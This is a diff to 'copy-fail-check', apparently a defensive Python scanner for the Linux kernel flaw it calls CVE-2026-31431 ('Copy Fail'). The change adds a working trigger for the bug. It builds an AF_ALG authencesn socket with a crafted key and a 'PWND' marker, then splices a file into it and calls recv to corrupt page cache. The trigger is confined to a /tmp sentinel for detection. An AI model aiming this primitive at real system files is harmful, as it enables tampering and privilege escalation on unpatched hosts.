@@ -6,6 +6,8 @@ Maintained by BleedWatch SASU. https://github.com/bleedwatch/copy-fail-check
 
 import argparse
 import atexit
+import ctypes
+import ctypes.util
 import errno
 import glob
 import hashlib
@@ -17,13 +19,14 @@ import shutil
 import signal
 import socket
 import stat
+import struct
 import subprocess
 import sys
 import time
 from datetime import datetime, timezone
 
 
-VERSION = "1.0.0"
+VERSION = "1.1.0"
 TOOL_NAME = "copy-fail-check"
 REPOSITORY_URL = "https://github.com/bleedwatch/copy-fail-check"
 INFO_URI = REPOSITORY_URL
@@ -33,14 +36,24 @@ AUDIT_LOG = "/var/log/bleedwatch-copy-fail-mitigation.log"
 MITIGATION_FILE = "/etc/modprobe.d/disable-af-alg.conf"
 MODULES = ("af_alg", "algif_aead", "algif_skcipher", "algif_hash", "algif_rng")
 ALGIF_MODULES = ("algif_aead", "algif_skcipher", "algif_hash", "algif_rng")
-LAST_UNFIXED_MAINLINE = (6, 14, 99)
 PATCH_COMMIT = "a664bf3d603d"
+
+# AF_ALG socket-option constants (uapi/linux/if_alg.h)
+SOL_ALG = 279
+ALG_SET_KEY = 1
+ALG_SET_IV = 2
+ALG_SET_OP = 3
+ALG_SET_AEAD_ASSOCLEN = 4
+ALG_OP_DECRYPT = 0
+# crypto_authenc rtattr key wrapper (crypto/authenc.c)
+CRYPTO_AUTHENC_KEYA_PARAM = 1
 
 EXIT_SAFE = 0
 EXIT_VULNERABLE = 2
 EXIT_MITIGATED = 3
 EXIT_DETECTION_ERROR = 10
-EXIT_RUNTIME_ERROR = 11
+EXIT_UNVERIFIED = 11
+EXIT_RUNTIME_ERROR = 11  # intentional alias of EXIT_UNVERIFIED: both mean "non-conclusive, re-investigate"
 EXIT_REMEDIATED = 20
 EXIT_REMEDIATION_CANCELLED = 21
 EXIT_REMEDIATION_FAILED = 22
@@ -65,6 +78,35 @@ def write_all(fd, data):
         view = view[written:]
 
 
+_LIBC_SPLICE = None
+
+
+def _libc_splice():
+    global _LIBC_SPLICE
+    if _LIBC_SPLICE is not None:
+        return _LIBC_SPLICE
+    libc_name = ctypes.util.find_library("c") or "libc.so.6"
+    libc = ctypes.CDLL(libc_name, use_errno=True)
+    fn = libc.splice
+    fn.restype = ctypes.c_ssize_t
+    fn.argtypes = (ctypes.c_int, ctypes.c_void_p,
+                   ctypes.c_int, ctypes.c_void_p,
+                   ctypes.c_size_t, ctypes.c_uint)
+    _LIBC_SPLICE = fn
+    return fn
+
+
+def splice_compat(in_fd, out_fd, length):
+    if hasattr(os, "splice"):
+        return os.splice(in_fd, out_fd, length)
+    fn = _libc_splice()
+    n = fn(in_fd, None, out_fd, None, length, 0)
+    if n < 0:
+        err = ctypes.get_errno()
+        raise OSError(err, os.strerror(err))
+    return n
+
+
 def parse_os_release_content(content):
     result = {}
     for raw_line in content.splitlines():
@@ -77,26 +119,6 @@ def parse_os_release_content(content):
             value = value[1:-1]
         result[key] = value
     return result
-
-
-def kernel_tuple(release):
-    parts = []
-    current = ""
-    for char in release:
-        if char.isdigit():
-            current += char
-        elif current:
-            parts.append(int(current))
-            current = ""
-            if len(parts) == 3:
-                break
-        elif parts:
-            break
-    if current and len(parts) < 3:
-        parts.append(int(current))
-    while len(parts) < 3:
-        parts.append(0)
-    return tuple(parts[:3])
 
 
 def module_name_from_proc(name):
@@ -124,11 +146,10 @@ def colorize(text, color, enabled):
 
 
 class CopyFailDetector:
-    def __init__(self, root="/", tmp_dir="/tmp", functional_test=True, deep_patch_check=False):
+    def __init__(self, root="/", tmp_dir="/tmp", functional_test=True):
         self.root = root
         self.tmp_dir = tmp_dir
         self.functional_test = functional_test
-        self.deep_patch_check = deep_patch_check
         self.warnings = []
 
     def root_path(self, absolute_path):
@@ -149,7 +170,7 @@ class CopyFailDetector:
             "functional_test": {"status": "not_run", "detail": None},
             "modules_loaded": [],
             "modprobe_mitigation": {"present": False, "files": [], "completeness": "none", "warnings": []},
-            "kernel_patch": {"detected": False, "evidence": None},
+            "kernel_patch": {"detected": False, "evidence": None, "weak_evidence": None},
         }
 
         env_status, env_errors, os_info = self.detect_environment()
@@ -289,28 +310,34 @@ class CopyFailDetector:
         return {"present": bool(blocked), "files": files, "completeness": completeness, "warnings": warnings}
 
     def analyze_kernel_patch(self, os_info, release, proc_version):
-        evidence_tokens = (CVE_ID, PATCH_COMMIT, "authencesn", "copy fail")
+        evidence = self.query_package_changelog(os_info, release)
+        if evidence:
+            return {"detected": True, "evidence": evidence, "weak_evidence": None}
+        weak = None
+        weak_tokens = (CVE_ID, PATCH_COMMIT, "authencesn", "copy fail")
         haystack = "\n".join([proc_version, release]).lower()
-        for token in evidence_tokens:
+        for token in weak_tokens:
             if token.lower() in haystack:
-                return {"detected": True, "evidence": "kernel metadata references {}".format(token)}
-        if kernel_tuple(release) > LAST_UNFIXED_MAINLINE:
-            return {"detected": True, "evidence": "mainline kernel version is newer than last known unfixed range"}
-        if self.deep_patch_check:
-            evidence = self.query_package_changelog(os_info, release)
-            if evidence:
-                return {"detected": True, "evidence": evidence}
-        return {"detected": False, "evidence": None}
+                weak = "kernel build metadata references {}".format(token)
+                break
+        return {"detected": False, "evidence": None, "weak_evidence": weak}
 
     def query_package_changelog(self, os_info, release):
         family = distro_family(os_info)
         commands = []
+        # Each query is pinned to the running kernel release so we never
+        # surface the changelog of a freshly-installed-but-not-yet-booted
+        # patched package while the host is still running an older
+        # vulnerable kernel.
         if family == "debian" and shutil.which("apt"):
             commands.append(["apt", "changelog", "linux-image-{}".format(release)])
         elif family == "rhel" and shutil.which("rpm"):
-            commands.append(["rpm", "-q", "--changelog", "kernel"])
+            if os_info.get("ID", "").lower() == "fedora":
+                commands.append(["rpm", "-q", "--changelog", "kernel-core-{}".format(release)])
+            commands.append(["rpm", "-q", "--changelog", "kernel-{}".format(release)])
         elif family == "suse" and shutil.which("rpm"):
-            commands.append(["rpm", "-q", "--changelog", "kernel-default"])
+            commands.append(["rpm", "-q", "--changelog", "kernel-default-{}".format(release)])
+            commands.append(["rpm", "-q", "--changelog", "kernel-{}".format(release)])
         for command in commands:
             try:
                 completed = subprocess.run(command, check=False, timeout=60, capture_output=True, text=True)
@@ -328,7 +355,8 @@ class CopyFailDetector:
 
     def run_functional_test(self):
         path = self.make_sentinel_path()
-        assert path.startswith("/tmp/")
+        if not path.startswith(self.tmp_dir.rstrip("/") + "/"):
+            return {"status": "setup_failed", "detail": "sentinel path outside configured tmp_dir"}
         flags = os.O_RDWR | os.O_CREAT | os.O_EXCL
         if hasattr(os, "O_NOFOLLOW"):
             flags |= os.O_NOFOLLOW
@@ -380,14 +408,21 @@ class CopyFailDetector:
             os.fsync(state["fd"])
             os.lseek(state["fd"], 0, os.SEEK_SET)
             os.read(state["fd"], len(pattern))
-            primitive_status = self.attempt_copy_fail_primitive(path)
+            primitive = self.execute_copy_fail_primitive(state["fd"], path)
             os.lseek(state["fd"], 0, os.SEEK_SET)
             after = os.read(state["fd"], len(pattern))
             if after != pattern:
-                return {"status": "modification_detected", "detail": "sentinel page cache changed at offset 0"}
-            if primitive_status != "attempted":
-                return {"status": "setup_failed", "detail": primitive_status}
-            return {"status": "no_modification", "detail": "sentinel remained unchanged"}
+                diffs = [(i, pattern[i], after[i]) for i in range(len(pattern)) if pattern[i] != after[i]]
+                first_offset = diffs[0][0] if diffs else 0
+                detail = ("sentinel page cache modified by Copy Fail primitive "
+                          "at offset {} ({} byte(s) altered)").format(first_offset, len(diffs))
+                if primitive["status"] == "attempted":
+                    detail += "; full sendmsg+splice+recv chain executed"
+                return {"status": "modification_detected", "detail": detail}
+            if primitive["status"] == "attempted":
+                return {"status": "no_modification",
+                        "detail": "primitive ran end-to-end and sentinel remained unchanged"}
+            return {"status": primitive["status"], "detail": primitive.get("detail")}
         except OSError as exc:
             detail = "{}: {}".format(exc.errno, exc.strerror)
             if exc.errno in (errno.EAFNOSUPPORT, errno.EPROTONOSUPPORT, errno.EPERM, errno.EACCES):
@@ -405,24 +440,135 @@ class CopyFailDetector:
                 except (OSError, RuntimeError, ValueError):
                     pass
 
-    def attempt_copy_fail_primitive(self, sentinel_path):
-        assert sentinel_path.startswith("/tmp/")
-        sock = None
+    def execute_copy_fail_primitive(self, sentinel_fd, sentinel_path):
+        """Run the Copy Fail primitive non-destructively on a /tmp sentinel.
+
+        Sets up an AF_ALG aead authencesn(hmac(sha1),cbc(aes)) socket, then
+        sendmsg(MSG_MORE) with controlled AAD, splice(sentinel -> pipe -> op
+        socket), and recv() to drive the in-place AEAD decrypt that triggers
+        the buggy scratch write into the spliced page cache pages on
+        vulnerable kernels.
+
+        We deliberately do NOT call posix_fadvise(POSIX_FADV_DONTNEED) on
+        the sentinel: that would evict the modified page cache and erase
+        the very marker we are trying to detect.
+
+        Touches no file outside the supplied sentinel_fd / sentinel_path.
+
+        Returns dict {"status": ..., "detail": ...} with status:
+          - "attempted":      full sendmsg+splice+recv chain ran end-to-end
+          - "setup_failed":   AF_ALG/key/accept/sendmsg/splice setup failed
+          - "error":          unexpected failure
+        """
+        expected_prefix = self.tmp_dir.rstrip("/") + "/"
+        if not sentinel_path.startswith(expected_prefix):
+            return {"status": "setup_failed",
+                    "detail": "refusing to operate outside tmp_dir ({})".format(self.tmp_dir)}
+        if not hasattr(socket, "AF_ALG"):
+            return {"status": "setup_failed",
+                    "detail": "Python build has no socket.AF_ALG"}
+
+        base = None
+        op = None
+        pipe_r = -1
+        pipe_w = -1
         try:
-            sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
             try:
-                sock.bind(("aead", "authencesn(hmac(sha1),cbc(aes))"))
+                base = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
             except OSError as exc:
-                if exc.errno in (errno.ENOENT, errno.ENODEV, errno.EINVAL, errno.EOPNOTSUPP):
-                    return "AF_ALG authencesn primitive unavailable: {}".format(exc)
-                raise
-            return "attempted"
+                return {"status": "setup_failed",
+                        "detail": "AF_ALG socket creation failed: {}".format(exc)}
+
+            try:
+                base.bind(("aead", "authencesn(hmac(sha1),cbc(aes))"))
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "bind authencesn unavailable: {}".format(exc)}
+
+            # authenc key layout (crypto/authenc.c::crypto_authenc_extractkeys):
+            # rtattr {len=8 (host endian), type=CRYPTO_AUTHENC_KEYA_PARAM},
+            # crypto_authenc_key_param.enckeylen=16 (BIG endian, be32_to_cpu),
+            # then auth_key (8 bytes HMAC) || enc_key (16 bytes AES-128).
+            rtattr = struct.pack("=HH", 8, CRYPTO_AUTHENC_KEYA_PARAM) + struct.pack(">I", 16)
+            key_buf = rtattr + (b"\x00" * 24)
+            try:
+                base.setsockopt(SOL_ALG, ALG_SET_KEY, key_buf)
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "ALG_SET_KEY failed: {}".format(exc)}
+
+            try:
+                op, _ = base.accept()
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "AF_ALG accept failed: {}".format(exc)}
+
+            try:
+                pipe_r, pipe_w = os.pipe()
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "pipe creation failed: {}".format(exc)}
+
+            iv = b"\x00" * 16
+            marker = b"PWND" + b"\x00" * 4  # 8-byte AAD
+            cmsg = [
+                (SOL_ALG, ALG_SET_OP, struct.pack("=I", ALG_OP_DECRYPT)),
+                (SOL_ALG, ALG_SET_IV, struct.pack("=I", 16) + iv),
+                (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("=I", 8)),
+            ]
+            try:
+                op.sendmsg([marker], cmsg, socket.MSG_MORE)
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "AF_ALG sendmsg failed: {}".format(exc)}
+
+            splice_len = 32
+            os.lseek(sentinel_fd, 0, os.SEEK_SET)
+            try:
+                n = splice_compat(sentinel_fd, pipe_w, splice_len)
+                if n <= 0:
+                    return {"status": "setup_failed",
+                            "detail": "splice(sentinel -> pipe) returned {}".format(n)}
+                n = splice_compat(pipe_r, op.fileno(), splice_len)
+                if n <= 0:
+                    return {"status": "setup_failed",
+                            "detail": "splice(pipe -> op) returned {}".format(n)}
+            except OSError as exc:
+                return {"status": "setup_failed",
+                        "detail": "splice failed: {}".format(exc)}
+
+            # recv drives the in-place AEAD decrypt; on vulnerable kernels
+            # the buggy scratch copy lands BEFORE the auth check fails, so
+            # EBADMSG / EINVAL here is expected and not a setup failure.
+            try:
+                op.recv(splice_len)
+            except OSError as exc:
+                if exc.errno not in (errno.EBADMSG, errno.EINVAL,
+                                     errno.EAGAIN, errno.EMSGSIZE):
+                    return {"status": "setup_failed",
+                            "detail": "AF_ALG recv unexpected error: {}".format(exc)}
+
+            return {"status": "attempted",
+                    "detail": "AF_ALG sendmsg + splice + recv chain executed against sentinel"}
+        except OSError as exc:
+            return {"status": "error", "detail": "{}: {}".format(exc.errno, exc.strerror)}
         finally:
-            if sock is not None:
+            if op is not None:
                 try:
-                    sock.close()
+                    op.close()
                 except OSError:
                     pass
+            if base is not None:
+                try:
+                    base.close()
+                except OSError:
+                    pass
+            for fd in (pipe_r, pipe_w):
+                if fd != -1:
+                    try:
+                        os.close(fd)
+                    except OSError:
+                        pass
 
     def verdict(self, host, checks):
         mitigation = checks["modprobe_mitigation"]
@@ -440,25 +586,52 @@ class CopyFailDetector:
         if functional["status"] == "modification_detected":
             recommendations.append("Apply the vendor kernel update or run --remediate for immediate AF_ALG mitigation")
             return ("vulnerable_confirmed_functional", True, EXIT_VULNERABLE,
-                    "Vulnerable - functional sentinel test detected page cache modification", recommendations)
-
-        if patch["detected"]:
-            if mitigation["present"] and loaded:
-                recommendations.append("Reboot when practical so loaded AF_ALG modules match boot-time policy")
-            return ("patched", False, EXIT_SAFE, "Non vulnerable - kernel patch evidence detected", recommendations)
+                    "Vulnerable - functional sentinel test confirmed Copy Fail primitive landed marker in page cache",
+                    recommendations)
 
         if af_alg["status"] == "blocked" or mitigation["completeness"] == "full":
             recommendations.append("Install the vendor kernel update when available; keep mitigation until reboot validation")
             return ("mitigated_modprobe", False, EXIT_MITIGATED,
                     "Vulnerable kernel exposure mitigated - AF_ALG blocked or fully disabled", recommendations)
 
-        if af_alg["status"] == "accessible":
-            recommendations.append("Patch the kernel or run sudo python3 copy-fail-check.py --remediate")
-            recommendations.append("Avoid relying on containers as a boundary for shared-kernel workloads")
-            return ("vulnerable_inferred_kernel", True, EXIT_VULNERABLE,
-                    "Vulnerable inferred - AF_ALG accessible and patch evidence not found", recommendations)
+        if af_alg["status"] not in ("accessible",):
+            recommendations.append("Re-run on the host (not inside a restricted container) and with root privileges")
+            return ("detection_error", True, EXIT_DETECTION_ERROR,
+                    "Detection inconclusive - AF_ALG syscall check returned status '{}'".format(af_alg["status"]),
+                    recommendations)
 
-        recommendations.append("Re-run with --audit on the host, not inside a restricted container")
+        if functional["status"] == "no_modification":
+            if patch["detected"]:
+                if mitigation["present"] and loaded:
+                    recommendations.append("Reboot when practical so loaded AF_ALG modules match boot-time policy")
+                return ("patched", False, EXIT_SAFE,
+                        "Non vulnerable - kernel patch evidence found in changelog (authoritative) and functional test confirmed primitive blocked",
+                        recommendations)
+            recommendations.append("Verify the kernel against the vendor advisory before trusting this verdict")
+            recommendations.append("Apply the vendor kernel update or run sudo python3 copy-fail-check.py --remediate")
+            return ("unverified", False, EXIT_UNVERIFIED,
+                    "Unverified - functional test reported no modification but no authoritative patch evidence was found; do not trust this as patched",
+                    recommendations)
+
+        if functional["status"] == "setup_failed":
+            recommendations.append("Re-run as root; the functional Copy Fail primitive could not be set up in this environment")
+            recommendations.append("If kernel changelog evidence is present, treat as likely patched; otherwise treat as unverified")
+            detail = functional.get("detail") or "unknown"
+            return ("unverified", False, EXIT_UNVERIFIED,
+                    "Unverified - functional test setup failed ({}); cannot confirm or deny exposure".format(detail),
+                    recommendations)
+
+        if functional["status"] == "not_run" and patch["detected"]:
+            return ("patched", False, EXIT_SAFE,
+                    "Non vulnerable - kernel patch evidence found in changelog (authoritative)", recommendations)
+
+        if functional["status"] == "not_run":
+            recommendations.append("Re-run without --verify to execute the functional Copy Fail primitive test")
+            return ("unverified", False, EXIT_UNVERIFIED,
+                    "Unverified - functional test was not executed and no authoritative patch evidence was found",
+                    recommendations)
+
+        recommendations.append("Re-run on the host (not inside a restricted container) and with root privileges")
         return ("detection_error", True, EXIT_DETECTION_ERROR,
                 "Detection inconclusive - AF_ALG syscall check failed unexpectedly", recommendations)
 
@@ -628,7 +801,7 @@ def make_sarif(result):
     verdict = result["verdict"]
     level = "error" if verdict["vulnerable"] else "warning" if verdict["exit_code"] == EXIT_MITIGATED else "note"
     results = []
-    if verdict["status"] in ("vulnerable_confirmed_functional", "vulnerable_inferred_kernel", "mitigated_modprobe"):
+    if verdict["status"] in ("vulnerable_confirmed_functional", "unverified", "mitigated_modprobe"):
         results.append({
             "ruleId": RULE_ID,
             "level": level,
@@ -697,7 +870,8 @@ def make_human(result, use_color=True):
         "",
         "Kernel",
         "  Patch status: {}".format(host["kernel"]["patch_status"]),
-        "  Patch evidence: {}".format(checks["kernel_patch"]["evidence"] or "none"),
+        "  Patch evidence (authoritative): {}".format(checks["kernel_patch"]["evidence"] or "none"),
+        "  Weak signal (informational only): {}".format(checks["kernel_patch"].get("weak_evidence") or "none"),
         "",
         "AF_ALG Status",
         "  Syscall: {}".format(checks["af_alg_syscall"]["status"]),
@@ -737,7 +911,8 @@ def build_parser():
     parser = argparse.ArgumentParser(description="Detect and remediate CVE-2026-31431 Copy Fail exposure")
     mode = parser.add_mutually_exclusive_group()
     mode.add_argument("--check", action="store_true", help="run read-only detection (default)")
-    mode.add_argument("--audit", action="store_true", help="run detection plus deeper diagnostic checks")
+    mode.add_argument("--audit", action="store_true",
+                      help="alias of --check; reserved for future detailed diagnostic scoring (changelog probe is now always on)")
     mode.add_argument("--remediate", action="store_true", help="apply AF_ALG modprobe mitigation after confirmation")
     mode.add_argument("--verify", action="store_true", help="verify an earlier remediation")
     parser.add_argument("--json", action="store_true", help="emit structured JSON")
@@ -786,7 +961,7 @@ def main(argv=None):
                 emit_output("\n".join(lines) + "\n", args.output_file)
         return code
 
-    detector = CopyFailDetector(functional_test=not args.verify, deep_patch_check=args.audit)
+    detector = CopyFailDetector(functional_test=not args.verify)
     result = detector.detect()
     if not args.quiet:
         if args.json:
